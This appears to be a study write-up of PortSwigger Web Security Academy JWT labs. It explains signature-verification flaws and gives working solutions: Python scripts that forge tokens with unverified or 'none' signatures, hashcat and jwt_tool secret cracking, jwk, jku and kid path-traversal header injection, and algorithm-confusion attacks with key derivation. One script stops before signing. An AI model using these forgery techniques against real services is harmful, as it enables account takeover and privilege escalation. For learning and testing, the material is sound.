### Accepting arbitrary signatures

JWT libraries typically provide one method for verifying tokens and another that just decodes them. For example, the Node.js library jsonwebtoken has verify() and decode().

Occasionally, developers confuse these two methods and only pass incoming tokens to the decode() method. This effectively means that the application doesn't verify the signature at all. 
### Lab: JWT authentication bypass via unverified signature

This lab uses a JWT-based mechanism for handling sessions. Due to implementation flaws, the server doesn't verify the signature of any JWTs that it receives.

To solve the lab, modify your session token to gain access to the admin panel at /admin, then delete the user carlos.

You can log in to your own account using the following credentials: wiener:peter 

![alt text](image/image11.png)
```py
import jwt
import base64

# Paste JWT token here
token = ''

# Decode the token (without verifying)
payload = jwt.decode(token, options={"verify_signature": False})

print(f"Decoded token: {payload}\n")

# Modify the token (JWT manipulation)
header, payload, signature = token.split('.')

decoded_payload = base64.urlsafe_b64decode(payload + '=' * (len(payload) % 4))
modified_payload = decoded_payload.replace(b'wiener', b'carlos')

print(f"Modified payload: {modified_payload.decode()}\n")

# Generate a new token with the modified payload (re-encode)
modified_payload_b64 = base64.urlsafe_b64encode(modified_payload).rstrip(b'=').decode()

modified_token = f"{header}.{modified_payload_b64}.{signature}"
print(f"Modified token: {modified_token}\n")
```
### Accepting tokens with no signature

Among other things, the JWT header contains an alg parameter. This tells the server which algorithm was used to sign the token and, therefore, which algorithm it needs to use when verifying the signature.
{
    "alg": "HS256",
    "typ": "JWT"
}

This is inherently flawed because the server has no option but to implicitly trust user-controllable input from the token which, at this point, hasn't been verified at all. In other words, an attacker can directly influence how the server checks whether the token is trustworthy.

JWTs can be signed using a range of different algorithms, but can also be left unsigned. In this case, the alg parameter is set to none, which indicates a so-called "unsecured JWT". Due to the obvious dangers of this, servers usually reject tokens with no signature. However, as this kind of filtering relies on string parsing, you can sometimes bypass these filters using classic obfuscation techniques, such as mixed capitalization and unexpected encodings. 

### Lab: JWT authentication bypass via flawed signature verification

This lab uses a JWT-based mechanism for handling sessions. The server is insecurely configured to accept unsigned JWTs.

To solve the lab, modify your session token to gain access to the admin panel at /admin, then delete the user carlos.

You can log in to your own account using the following credentials: wiener:peter

![alt text](image/image10.png)
```py
import jwt

# Paste JWT token here
token = ''

# Decode the token (without verifying)
decoded_token = jwt.decode(token, options={"verify_signature": False})

print(f"Decoded token: {decoded_token}\n")

# Modify the token (JWT manipulation)
decoded_token['sub'] = 'administrator'

print(f"Modified payload: {decoded_token}\n")

# Generate a new token with the modified payload (re-encode)
# Re-encode the JWT with None algorithm
modified_token = jwt.encode(decoded_token, None, algorithm='none') 
print(f"Modified token: {modified_token}\n")
```
## Brute-forcing secret keys

Some signing algorithms, such as HS256 (HMAC + SHA-256), use an arbitrary, standalone string as the secret key. Just like a password, it's crucial that this secret can't be easily guessed or brute-forced by an attacker. Otherwise, they may be able to create JWTs with any header and payload values they like, then use the key to re-sign the token with a valid signature.

When implementing JWT applications, developers sometimes make mistakes like forgetting to change default or placeholder secrets. They may even copy and paste code snippets they find online, then forget to change a hardcoded secret that's provided as an example. In this case, it can be trivial for an attacker to brute-force a server's secret using a wordlist of well-known secrets. 
### Brute-forcing secret keys using hashcat
You just need a valid, signed JWT from the target server and a wordlist of [well-known secrets](https://github.com/wallarm/jwt-secrets/blob/master/jwt.secrets.list). You can then run the following command, passing in the JWT and wordlist as arguments:
`hashcat -a 0 -m 16500 <jwt> <wordlist>`

Hashcat signs the header and payload from the JWT using each secret in the wordlist, then compares the resulting signature with the original one from the server. If any of the signatures match, hashcat outputs the identified secret in the following format, along with various other details:
`<jwt>:<identified-secret>`

### Lab: JWT authentication bypass via weak signing key

This lab uses a JWT-based mechanism for handling sessions. It uses an extremely weak secret key to both sign and verify tokens. This can be easily brute-forced using a wordlist of common secrets.

To solve the lab, first brute-force the website's secret key. Once you've obtained this, use it to sign a modified session token that gives you access to the admin panel at /admin, then delete the user carlos.

You can log in to your own account using the following credentials: wiener:peter 
```
$ python3 jwt_tool.py eyJraWQiOiI1MjZjYTFmNy02YzA4LTQ2MjgtODIyMi05NzRhZDE2N2IyYzciLCJhbGciOiJIUzI1NiJ9.eyJpc3MiOiJwb3J0c3dpZ2dlciIsImV4cCI6MTczODAyNTQzMSwic3ViIjoid2llbmVyIn0.VNsVAM3_6sOiwk_xpY679byQLy2-7cK1OD7iDcS86DI -C -d rockyou.txt

        \   \        \         \          \                    \ 
   \__   |   |  \     |\__    __| \__    __|                    |
         |   |   \    |      |          |       \         \     |
         |        \   |      |          |    __  \     __  \    |
  \      |      _     |      |          |   |     |   |     |   |
   |     |     / \    |      |          |   |     |   |     |   |
\        |    /   \   |      |          |\        |\        |   |
 \______/ \__/     \__|   \__|      \__| \______/  \______/ \__|
 Version 2.2.7                \______|             @ticarpi      

Original JWT: 

[+] secret1 is the CORRECT key!
You can tamper/fuzz the token contents (-T/-I) and sign it using:
python3 jwt_tool.py [options here] -S hs256 -p "secret1"
```
![alt text](image/image12.png)

## JWT header parameter injections

According to the JWS specification, only the alg header parameter is mandatory. In practice, however, JWT headers (also known as JOSE headers) often contain several other parameters. The following ones are of particular interest to attackers.

-    `jwk` (JSON Web Key) - Provides an embedded JSON object representing the key.

-    `jku` (JSON Web Key Set URL) - Provides a URL from which servers can fetch a set of keys containing the correct key.

-    `kid` (Key ID) - Provides an ID that servers can use to identify the correct key in cases where there are multiple keys to choose from. Depending on the format of the key, this may have a matching kid parameter.

As you can see, these user-controllable parameters each tell the recipient server which key to use when verifying the signature. In this section, you'll learn how to exploit these to inject modified JWTs signed using your own arbitrary key rather than the server's secret.
### Injecting self-signed JWTs via the jwk parameter

The JSON Web Signature (JWS) specification describes an optional jwk header parameter, which servers can use to embed their public key directly within the token itself in JWK format.

**JWK**

A JWK (JSON Web Key) is a standardized format for representing keys as a JSON object.

You can see an example of this in the following JWT header:
```
{
    "kid": "ed2Nf8sb-sD6ng0-scs5390g-fFD8sfxG",
    "typ": "JWT",
    "alg": "RS256",
    "jwk": {
        "kty": "RSA",
        "e": "AQAB",
        "kid": "ed2Nf8sb-sD6ng0-scs5390g-fFD8sfxG",
        "n": "yy1wpYmffgXBxhAUJzHHocCuJolwDqql75ZWuCQ_cb33K2vh9m"
    }
}
```
**Public and private keys**

In case you're not familiar with the terms "public key" and "private key", we've covered this as part of our materials on algorithm confusion attacks. For more information, see Symmetric vs asymmetric algorithms.

Ideally, servers should only use a limited whitelist of public keys to verify JWT signatures. However, misconfigured servers sometimes use any key that's embedded in the jwk parameter.

You can exploit this behavior by signing a modified JWT using your own RSA private key, then embedding the matching public key in the jwk header.

Although you can manually add or modify the jwk parameter in Burp, the JWT Editor extension provides a useful feature to help you test for this vulnerability:

-    With the extension loaded, in Burp's main tab bar, go to the JWT Editor Keys tab.

-    Generate a new RSA key.

-    Send a request containing a JWT to Burp Repeater.

-    In the message editor, switch to the extension-generated JSON Web Token tab and modify the token's payload however you like.

-    Click Attack, then select Embedded JWK. When prompted, select your newly generated RSA key.

-    Send the request to test how the server responds.

You can also perform this attack manually by adding the jwk header yourself. However, you may also need to update the JWT's kid header parameter to match the kid of the embedded key. The extension's built-in attack takes care of this step for you. 
### Lab: JWT authentication bypass via jwk header injection

This lab uses a JWT-based mechanism for handling sessions. The server supports the jwk parameter in the JWT header. This is sometimes used to embed the correct verification key directly in the token. However, it fails to check whether the provided key came from a trusted source.

To solve the lab, modify and sign a JWT that gives you access to the admin panel at /admin, then delete the user carlos.

You can log in to your own account using the following credentials: wiener:peter 

![alt text](image/image13.png)
```py
import jwt
import base64
from cryptography.hazmat.primitives import serialization
from cryptography.hazmat.backends import default_backend

token = ''

with open('public_key.pem', 'rb') as f:
    public_key = serialization.load_pem_public_key(
        f.read(),
        backend=default_backend()
    )

decoded_token = jwt.decode(token, options={"verify_signature": False})
print(f"Decoded token: {decoded_token}")

decoded_header = jwt.get_unverified_header(token)
print(f"Decoded header: {decoded_header}\n")

decoded_token['sub'] = 'administrator'
print(f"Modified token: {decoded_token}\n")

with open('private_key.pem', 'rb') as f:
    private_key = serialization.load_pem_private_key(
        f.read(),
        password=None,
        backend=default_backend()
    )

```
### Injecting self-signed JWTs via the jku parameter

Instead of embedding public keys directly using the jwk header parameter, some servers let you use the jku (JWK Set URL) header parameter to reference a JWK Set containing the key. When verifying the signature, the server fetches the relevant key from this URL.

**JWK Set**

A JWK Set is a JSON object containing an array of JWKs representing different keys. 
```
{
    "keys": [
        {
            "kty": "RSA",
            "e": "AQAB",
            "kid": "75d0ef47-af89-47a9-9061-7c02a610d5ab",
            "n": "o-yy1wpYmffgXBxhAUJzHHocCuJolwDqql75ZWuCQ_cb33K2vh9mk6GPM9gNN4Y_qTVX67WhsN3JvaFYw-fhvsWQ"
        },
        {
            "kty": "RSA",
            "e": "AQAB",
            "kid": "d8fDFo-fS9-faS14a9-ASf99sa-7c1Ad5abA",
            "n": "fc3f-yy1wpYmffgXBxhAUJzHql79gNNQ_cb33HocCuJolwDqmk6GPM4Y_qTVX67WhsN3JvaFYw-dfg6DH-asAScw"
        }
    ]
}
```
JWK Sets like this are sometimes exposed publicly via a standard endpoint, such as `/.well-known/jwks.json`.

More secure websites will only fetch keys from trusted domains, but you can sometimes take advantage of URL parsing discrepancies to bypass this kind of filtering.
### Lab: JWT authentication bypass via jku header injection

This lab uses a JWT-based mechanism for handling sessions. The server supports the jku parameter in the JWT header. However, it fails to check whether the provided URL belongs to a trusted domain before fetching the key.

To solve the lab, forge a JWT that gives you access to the admin panel at /admin, then delete the user carlos.

You can log in to your own account using the following credentials: wiener:peter 

>Create a new RSA key

![alt text](image/image14.png)

>Copy the public key as JWK
```
{
    "kty": "RSA",
    "e": "AQAB",
    "kid": "dd427b92-5e93-46c8-a5bd-4f888f0371b6",
    "n": "wdUTQPZrok3A93FFYxQfjLgvy-OdwxCa1KVCD9PCiygAE1FgajQuhoZ0DOEH6ewgxZV1TYgxE22TBc-DT4UsiGgcSJYcl4po9FD4nRDGEEcDv_3ED9GR7ZFnfMaitW74tkwJtDBHzxy5DWTMhJuv_QIE_By27-F48H_7yd0L8F_5zWbBhflWzm2erzjM2miftcds7JTc7dXyhkH56eLkd6bP3rfCHON3ZrbZ8ezja1YviSeuJeBg8bNu2b7OrDBBBmUhq1hkl0UomV-DOvKHHwngbC_NmuaGU2TmsEucFcp0hVk65AMwYVKtmIcHpUoUVXVrRNXOAu7Ev8wZ1g04tQ"
}
```
>Add jku value, match the kid value and sign with the new key

![alt text](image/image15.png)
### Injecting self-signed JWTs via the kid parameter

Servers may use several cryptographic keys for signing different kinds of data, not just JWTs. For this reason, the header of a JWT may contain a kid (Key ID) parameter, which helps the server identify which key to use when verifying the signature.

Verification keys are often stored as a JWK Set. In this case, the server may simply look for the JWK with the same kid as the token. However, the JWS specification doesn't define a concrete structure for this ID - it's just an arbitrary string of the developer's choosing. For example, they might use the kid parameter to point to a particular entry in a database, or even the name of a file.

If this parameter is also vulnerable to directory traversal, an attacker could potentially force the server to use an arbitrary file from its filesystem as the verification key.
```
{
    "kid": "../../path/to/file",
    "typ": "JWT",
    "alg": "HS256",
    "k": "asGsADas3421-dfh9DGN-AFDFDbasfd8-anfjkvc"
}
```
This is especially dangerous if the server also supports JWTs signed using a symmetric algorithm. In this case, an attacker could potentially point the kid parameter to a predictable, static file, then sign the JWT using a secret that matches the contents of this file.

You could theoretically do this with any file, but one of the simplest methods is to use `/dev/null`, which is present on most Linux systems. As this is an empty file, reading it returns an empty string. Therefore, signing the token with a empty string will result in a valid signature.
Note

>If you're using the JWT Editor extension, note that this doesn't let you sign tokens using an empty string. However, due to a bug in the extension, you can get around this by using a Base64-encoded null byte.
### Lab: JWT authentication bypass via kid header path traversal

This lab uses a JWT-based mechanism for handling sessions. In order to verify the signature, the server uses the kid parameter in JWT header to fetch the relevant key from its filesystem.

To solve the lab, forge a JWT that gives you access to the admin panel at /admin, then delete the user carlos.

You can log in to your own account using the following credentials: wiener:peter

Create a new symmetric key with the `k` value `AA==` which is base64-encoded null byte

![alt text](image/image16.png)

Change the `kid` value and sign with the above key

![alt text](image/image17.png)

### Other interesting JWT header parameters

The following header parameters may also be interesting for attackers:

-    `cty` (Content Type) - Sometimes used to declare a media type for the content in the JWT payload. This is usually omitted from the header, but the underlying parsing library may support it anyway. If you have found a way to bypass signature verification, you can try injecting a cty header to change the content type to text/xml or application/x-java-serialized-object, which can potentially enable new vectors for XXE and deserialization attacks.

-    `x5c` (X.509 Certificate Chain) - Sometimes used to pass the X.509 public key certificate or certificate chain of the key used to digitally sign the JWT. This header parameter can be used to inject self-signed certificates, similar to the jwk header injection attacks discussed above. Due to the complexity of the X.509 format and its extensions, parsing these certificates can also introduce vulnerabilities. Details of these attacks are beyond the scope of these materials, but for more details, check out CVE-2017-2800 and CVE-2018-2633.

## Algorithm confusion attacks

Algorithm confusion attacks (also known as key confusion attacks) occur when an attacker is able to force the server to verify the signature of a JSON web token (JWT) using a different algorithm than is intended by the website's developers. If this case isn't handled properly, this may enable attackers to forge valid JWTs containing arbitrary values without needing to know the server's secret signing key. 
### Symmetric vs asymmetric algorithms

JWTs can be signed using a range of different algorithms. Some of these, such as `HS256` (HMAC + SHA-256) use a "symmetric" key. This means that the server uses a single key to both sign and verify the token. Clearly, this needs to be kept secret, just like a password.
Signing and verifying JWTs using a symmetric algorithm

![alt text](image/image18.png)

Other algorithms, such as `RS256` (RSA + SHA-256) use an "asymmetric" key pair. This consists of a private key, which the server uses to sign the token, and a mathematically related public key that can be used to verify the signature. 

![alt text](image/image19.png)
### How do algorithm confusion vulnerabilities arise?

Algorithm confusion vulnerabilities typically arise due to flawed implementation of JWT libraries. Although the actual verification process differs depending on the algorithm used, many libraries provide a single, algorithm-agnostic method for verifying signatures. These methods rely on the alg parameter in the token's header to determine the type of verification they should perform.

The following pseudo-code shows a simplified example of what the declaration for this generic verify() method might look like in a JWT library:
```js
function verify(token, secretOrPublicKey){
    algorithm = token.getAlgHeader();
    if(algorithm == "RS256"){
        // Use the provided key as an RSA public key
    } else if (algorithm == "HS256"){
        // Use the provided key as an HMAC secret key
    }
}
```
Problems arise when website developers who subsequently use this method assume that it will exclusively handle JWTs signed using an asymmetric algorithm like `RS256`. Due to this flawed assumption, they may always pass a fixed public key to the method as follows:
```js
publicKey = <public-key-of-server>;
token = request.getCookie("session");
verify(token, publicKey);
```
In this case, if the server receives a token signed using a symmetric algorithm like `HS256`, the library's generic verify() method will treat the public key as an `HMAC` secret. This means that an attacker could sign the token using `HS256` and the public key, and the server will use the same public key to verify the signature. 
>The public key you use to sign the token must be absolutely identical to the public key stored on the server. This includes using the same format (such as X.509 PEM) and preserving any non-printing characters like newlines. In practice, you may need to experiment with different formatting in order for this attack to work. 
### Performing an algorithm confusion attack

An algorithm confusion attack generally involves the following high-level steps:

-    Obtain the server's public key

-    Convert the public key to a suitable format

-    Create a malicious JWT with a modified payload and the alg header set to HS256.

-    Sign the token with HS256, using the public key as the secret.

**Step 1 - Obtain the server's public key**

Servers sometimes expose their public keys as JSON Web Key (JWK) objects via a standard endpoint mapped to `/jwks.json` or `/.well-known/jwks.json`, for example. These may be stored in an array of JWKs called keys. This is known as a JWK Set.
```
{
    "keys": [
        {
            "kty": "RSA",
            "e": "AQAB",
            "kid": "75d0ef47-af89-47a9-9061-7c02a610d5ab",
            "n": "o-yy1wpYmffgXBxhAUJzHHocCuJolwDqql75ZWuCQ_cb33K2vh9mk6GPM9gNN4Y_qTVX67WhsN3JvaFYw-fhvsWQ"
        },
        {
            "kty": "RSA",
            "e": "AQAB",
            "kid": "d8fDFo-fS9-faS14a9-ASf99sa-7c1Ad5abA",
            "n": "fc3f-yy1wpYmffgXBxhAUJzHql79gNNQ_cb33HocCuJolwDqmk6GPM4Y_qTVX67WhsN3JvaFYw-dfg6DH-asAScw"
        }
    ]
}
```
Even if the key isn't exposed publicly, you may be able to extract it from a pair of existing JWTs. 

**Step 2 - Convert the public key to a suitable format**

Although the server may expose their public key in JWK format, when verifying the signature of a token, it will use its own copy of the key from its local filesystem or database. This may be stored in a different format.

In order for the attack to work, the version of the key that you use to sign the JWT must be identical to the server's local copy. In addition to being in the same format, every single byte must match, including any non-printing characters.

For the purpose of this example, let's assume that we need the key in X.509 PEM format. You can convert a JWK to a PEM using the JWT Editor extension in Burp as follows:

-    With the extension loaded, in Burp's main tab bar, go to the JWT Editor Keys tab.

-    Click New RSA Key. In the dialog, paste the JWK that you obtained earlier.

-    Select the PEM radio button and copy the resulting PEM key.

-    Go to the Decoder tab and Base64-encode the PEM.

-    Go back to the JWT Editor Keys tab and click New Symmetric Key.

-    In the dialog, click Generate to generate a new key in JWK format.

-    Replace the generated value for the k parameter with a Base64-encoded PEM key that you just copied.

-    Save the key.

**Step 3 - Modify your JWT**

Once you have the public key in a suitable format, you can modify the JWT however you like. Just make sure that the alg header is set to HS256.

**Step 4 - Sign the JWT using the public key**

Sign the token using the HS256 algorithm with the RSA public key as the secret. 

### Lab: JWT authentication bypass via algorithm confusion

This lab uses a JWT-based mechanism for handling sessions. It uses a robust RSA key pair to sign and verify tokens. However, due to implementation flaws, this mechanism is vulnerable to algorithm confusion attacks.

To solve the lab, first obtain the server's public key. This is exposed via a standard endpoint. Use this key to sign a modified session token that gives you access to the admin panel at /admin, then delete the user carlos.

You can log in to your own account using the following credentials: wiener:peter 
>You can assume that the server stores its public key as an X.509 PEM file. 

Get the public key
```
┌─[nguyenlong05@sw1mj3llyf1sh] - [~] - [Tue Jan 28, 22:25]
└─[$] <> curl https://0a3c005704f95b898024172b000b001d.web-security-academy.net/jwks.json
{"keys":[{"kty":"RSA","e":"AQAB","use":"sig","kid":"0dccebc5-27c1-4e24-a95c-50237df346d2","alg":"RS256","n":"yalo0qOVU_KsjukgpGExEDHfXSHWP7a_EBUn3zAQHHK-eXOu6mbS_tve8NiDOpvesClRDaLRPpOqZe2A6fnDVPYWVg5U_Bkk_jEKQICI6iZtD0M9IPGE2Cw276Q_yBjQxXjBKRYnkDnZo6taAjWbjjhKs0wyA7RFs0DVTe8WbAShZMshRhzuAgQBOeZDLG-PGGxsFE95gR022QMgXsiyHXn4xjjKLQVqdO2dBnjBJ4Z3aAjyMsKHvFXbD2NDatDh9E1PHFjG6qeiy0gWxCsGezNb6iNA6zKWag-zzV7CxwuyHv-sB2RYhrAjBKUG3q6MiZaLYykc9aeKetx_X25s4w"}]}%   
```

![alt text](image/image20.png)

Get the base64-encoded of the public key to a `k` value of a new sysmetric key

![alt text](image/image21.png)

Change the `alg` value to `HS256` and sign with the above key

![alt text](image/image22.png)
### Deriving public keys from existing tokens

In cases where the public key isn't readily available, you may still be able to test for algorithm confusion by deriving the key from a pair of existing JWTs. This process is relatively simple using tools such as `jwt_forgery.py`. You can find this, along with several other useful scripts, on the [rsa_sign2n GitHub repository](https://github.com/silentsignal/rsa_sign2n).

This uses the JWTs that you provide to calculate one or more potential values of `n`. Don't worry too much about what this means - all you need to know is that only one of these matches the value of `n` used by the server's key. For each potential value, our script outputs:

-    A Base64-encoded PEM key in both X.509 and PKCS1 format.

-    A forged JWT signed using each of these keys.

To identify the correct key, use Burp Repeater to send a request containing each of the forged JWTs. Only one of these will be accepted by the server. You can then use the matching key to construct an algorithm confusion attack. 
### Lab: JWT authentication bypass via algorithm confusion with no exposed key

This lab uses a JWT-based mechanism for handling sessions. It uses a robust RSA key pair to sign and verify tokens. However, due to implementation flaws, this mechanism is vulnerable to algorithm confusion attacks.

To solve the lab, first obtain the server's public key. Use this key to sign a modified session token that gives you access to the admin panel at /admin, then delete the user carlos.

You can log in to your own account using the following credentials: wiener:peter 

```
$ docker run --rm -it portswigger/sig2n <token1> <token2>
```
```
Found n with multiplier 1:
    Base64 encoded x509 key: LS0tLS1CRUdJTiBQVUJMSUMgS0VZLS0tLS0KTUlJQklqQU5CZ2txaGtpRzl3MEJBUUVGQUFPQ0FROEFNSUlCQ2dLQ0FRRUFrL3VtS3d4dWdFUW5pTmdXdHNTSQo1MjFuOUlrRnZqcUliRzJRakx2S21Ub2Z4ZndOT1VVWms3RldJQ25RMktrbTI2Z3NLeDdUUnU1KysyblRxNktkClZVSjVlMnkxTkdPcTVyaXd5WTc0a2twS3duUlU4WmZlNXhXVkt0eElrT1pxMnh6T09SR3VKTk5kOHFFcWRJYnYKdkxDQjVhbVJZdytiWnVEdnc0bFMweVpLSEVNOG1lQ2N0dGROQUYxK2syajBZZ3phU2xqTmJySFNHL2FmTm1qYgpVUE9vUjlXaTl3Rno0ejVWQ2dKSnVyMldNSHdISGdaaHFqeVZpV2xSNGtYb2ZWWEtSRXBtZTlFSXlKckdBd05ZClRsdkh1ZmhOQnJPaWZUTmo0RUVkQjMxUVdKbEI0SFMvaXpKZzQ1VnJxY29sV0RDc3NmNmI1ZllsQ21jVDdiMUcKbHdJREFRQUIKLS0tLS1FTkQgUFVCTElDIEtFWS0tLS0tCg==
    Tampered JWT: eyJraWQiOiIzNjhmZDU4Yy1mNjg5LTRlZDEtOWEwYS1iZjJlZGZkMTFlMGYiLCJhbGciOiJIUzI1NiJ9.eyJpc3MiOiAicG9ydHN3aWdnZXIiLCAiZXhwIjogMTczODE2ODA0MywgInN1YiI6ICJ3aWVuZXIifQ.R_y0kAjNXKZjgmVHyXwJSiFvzVlTB-xfpgzlzuJaTh8
    Base64 encoded pkcs1 key: LS0tLS1CRUdJTiBSU0EgUFVCTElDIEtFWS0tLS0tCk1JSUJDZ0tDQVFFQWsvdW1Ld3h1Z0VRbmlOZ1d0c1NJNTIxbjlJa0Z2anFJYkcyUWpMdkttVG9meGZ3Tk9VVVoKazdGV0lDblEyS2ttMjZnc0t4N1RSdTUrKzJuVHE2S2RWVUo1ZTJ5MU5HT3E1cml3eVk3NGtrcEt3blJVOFpmZQo1eFdWS3R4SWtPWnEyeHpPT1JHdUpOTmQ4cUVxZElidnZMQ0I1YW1SWXcrYlp1RHZ3NGxTMHlaS0hFTThtZUNjCnR0ZE5BRjErazJqMFlnemFTbGpOYnJIU0cvYWZObWpiVVBPb1I5V2k5d0Z6NHo1VkNnSkp1cjJXTUh3SEhnWmgKcWp5VmlXbFI0a1hvZlZYS1JFcG1lOUVJeUpyR0F3TllUbHZIdWZoTkJyT2lmVE5qNEVFZEIzMVFXSmxCNEhTLwppekpnNDVWcnFjb2xXRENzc2Y2YjVmWWxDbWNUN2IxR2x3SURBUUFCCi0tLS0tRU5EIFJTQSBQVUJMSUMgS0VZLS0tLS0K
    Tampered JWT: eyJraWQiOiIzNjhmZDU4Yy1mNjg5LTRlZDEtOWEwYS1iZjJlZGZkMTFlMGYiLCJhbGciOiJIUzI1NiJ9.eyJpc3MiOiAicG9ydHN3aWdnZXIiLCAiZXhwIjogMTczODE2ODA0MywgInN1YiI6ICJ3aWVuZXIifQ.2Mj05Zo78iC31AznHeroWnR4wnSwT3TVkAUkumODeVg
```

Create a new symmetric key with one of the valid key above

![alt text](image/image-10.png)

Sign with a new key

![alt text](image/image-11.png)